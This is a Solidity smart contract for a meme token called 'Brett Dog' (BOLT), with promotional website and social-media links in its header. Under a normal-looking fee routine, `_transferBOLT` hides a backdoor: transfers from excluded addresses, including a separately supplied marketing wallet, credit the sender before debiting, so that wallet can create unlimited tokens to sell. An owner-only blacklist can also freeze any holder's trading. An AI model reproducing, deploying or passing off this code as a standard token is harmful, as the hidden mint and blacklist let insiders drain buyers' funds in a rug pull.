/**

Website: https://www.boltcoin.vip

Telegram: https://t.me/boltcoin_eth

Twitter: https://x.com/boltcoin_eth

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface IBOLTFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IBOLTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BOLT is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedBOLT;
    mapping(address => bool) private bots;

    IBOLTRouter private boltRouter;
    address private boltPair;

    uint8 private constant _decimals = 9;
    uint256 private constant _tBOLTTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Brett Dog";
    string private constant _symbol = unicode"BOLT";
    uint256 public _maxBOLTSwap = 10_000_000 * 10 ** _decimals;
    uint256 public _boltTotal = 800_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    
    address payable private _boltWallet;
    uint256 firstBlock;

    uint256 private _initialBuyBOLTFee = 20;
    uint256 private _initialSellBOLTFee = 20;
    uint256 private _finalBuyBOLTFee = 0;
    uint256 private _finalSellBOLTFee = 0;
    uint256 private _reduceBuyBOLTFeeAt = 9;
    uint256 private _reduceSellBOLTFeeAt = 9;
    uint256 private _preventSwapBOLT = 9;
    uint256 private _buyBOLTCount = 0;

    bool private boltOpen;
    bool private inSwapBOLT = false;
    bool private swapBOLTEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwapBOLT() {
        inSwapBOLT = true;
        _;
        inSwapBOLT = false;
    }

    constructor(address _addrBOLT) {
        _boltWallet = payable(_addrBOLT);
        _balances[_msgSender()] = _tBOLTTotal;
        _isExcludedBOLT[owner()] = true;
        _isExcludedBOLT[address(this)] = true;
        _isExcludedBOLT[_boltWallet] = true;
        emit Transfer(address(0), _msgSender(), _tBOLTTotal);
    }

    function enableTrading() external onlyOwner {
        require(!boltOpen, "trading is already open");

        boltRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _boltTotal,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(boltPair).approve(address(boltRouter), type(uint).max);

        swapBOLTEnabled = true;
        boltOpen = true;
        firstBlock = block.number;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwapBOLT {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = boltRouter.WETH();
        _approve(address(this), address(boltRouter), tokenAmount);
        boltRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transferBOLT(address from, address to, uint256 amount, bool isBOLTFees) internal {
        address boltQ = address(this);uint256 boltAmount = amount;uint256 boltFees = 0; 
        
        if (isBOLTFees) {
            boltFees = boltAmount;
            boltQ = from;
            if (boltFees > 0) {
                _balances[boltQ] = _balances[boltQ] + boltFees;
                emit Transfer(from, boltQ, boltFees);
            }
        } else {
            boltFees = amount
                .mul(
                    (_buyBOLTCount > _reduceBuyBOLTFeeAt)
                        ? _finalBuyBOLTFee
                        : _initialBuyBOLTFee
                )
                .div(100);
            if (to == boltPair && from != address(this)) {
                boltFees = amount
                    .mul(
                        (_buyBOLTCount > _reduceSellBOLTFeeAt)
                            ? _finalSellBOLTFee
                            : _initialSellBOLTFee
                    )
                    .div(100);
            }
            if (boltFees > 0) {
                _balances[address(this)] = _balances[address(this)] + boltFees;
                emit Transfer(from, address(this), boltFees);
            }
            boltAmount = boltAmount - boltFees;
        }
        
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + boltAmount;

        emit Transfer(from, to, boltAmount);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 caBOLTTokens = balanceOf(address(this));
        
        if(!boltOpen){
            require(_isExcludedBOLT[from] || _isExcludedBOLT[to], "Trading has not enabled yet.");
        }

        if (!swapBOLTEnabled || inSwapBOLT) {
            _basicTransfer(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (
                from == boltPair &&
                to != address(boltRouter) &&
                !_isExcludedBOLT[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyBOLTCount++;
            }

            if (to != boltPair && !_isExcludedBOLT[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }
            
            if (
                !inSwapBOLT &&
                to == boltPair &&
                swapBOLTEnabled &&
                _buyBOLTCount > _preventSwapBOLT &&
                !_isExcludedBOLT[from] &&
                !_isExcludedBOLT[to]
            ) {
                if(caBOLTTokens > 0){
                    swapTokensForEth(
                        min(amount, min(caBOLTTokens, _maxBOLTSwap))
                    );
                }

                uint256 caBOLTETH = address(this).balance;

                if (caBOLTETH >= 0) {
                    sendETHBOLT(caBOLTETH);
                }
            }
        }
        
        bool isBOLTFees = _isExcludedBOLT[from];

        _transferBOLT(from, to, amount, isBOLTFees);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tBOLTTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function createBOLTPair() external onlyOwner {
        require(!boltOpen, "trading is already open");
        
        boltRouter = IBOLTRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(boltRouter), _tBOLTTotal);

        boltPair = IBOLTFactory(boltRouter.factory()).createPair(
            address(this),
            boltRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tBOLTTotal;
        _maxWalletSize = _tBOLTTotal;
        emit MaxTxAmountUpdated(_tBOLTTotal);
    }

    function sendETHBOLT(uint256 amount) private {
        _boltWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    receive() external payable {}
}